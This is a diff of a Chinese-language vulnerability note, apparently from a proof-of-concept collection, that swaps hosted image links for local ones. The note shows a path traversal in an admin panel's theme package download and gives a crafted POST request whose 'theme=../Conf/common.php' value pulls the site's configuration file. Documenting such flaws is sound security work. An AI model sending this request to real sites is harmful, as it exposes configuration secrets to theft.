@@ -20,15 +20,15 @@ icon_hash="1167011145"
 
 登录页面如下
 
-![image-20220518154815562](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181548621.png)
+![image-20220518154815562](./images/202205181548621.png)
 
 存在漏洞的文件为 `Application/Admin/Model/ThemeController.class.php`
 
-![image-20220518154826306](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181548388.png)
+![image-20220518154826306](./images/202205181548388.png)
 
 其中 theme参数为用户可控参数，根据函数流程可以发现存在的文件将会打包为 zip文件提供下载
 
-![image-20220518154838931](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181548023.png)
+![image-20220518154838931](./images/202205181548023.png)
 
 构造请求
 
@@ -38,4 +38,4 @@ POST /admin.php?s=/theme/packageDownload
 theme=../Conf/common.php
 ```
 
-![image-20220518154851785](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181548889.png)
+![image-20220518154851785](./images/202205181548889.png)
